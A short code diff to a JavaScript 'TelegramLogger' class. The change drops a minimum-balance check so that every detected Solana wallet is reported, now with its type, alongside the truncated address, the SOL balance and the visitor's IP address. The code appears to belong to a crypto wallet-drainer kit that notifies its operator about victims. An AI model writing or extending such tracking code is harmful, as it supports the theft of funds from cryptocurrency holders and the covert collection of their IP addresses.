@@ -88,22 +88,21 @@ class TelegramLogger {
   }
 
   /**
-   * Log wallet detection (only when wallet is detected with meaningful balance)
+   * Log wallet detection (all wallets, balance will be updated later)
    */
   async logWalletDetected(data) {
     const balance = data.lamports || 0;
     const balanceSOL = (balance / 1e9).toFixed(6);
     
-    // Only log if wallet has meaningful balance (> 0.0001 SOL)
-    if (balance < 100000) return;
-    
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
+    const walletType = data.walletType || 'Unknown';
 
     const message = `
 <b>👛 Wallet Detected</b>
 
 👤 <b>Wallet:</b> <code>${walletAddress}</code>
+💼 <b>Type:</b> ${walletType}
 💰 <b>Balance:</b> ${balanceSOL} SOL
 🌐 <b>IP:</b> ${ip}
     `.trim();
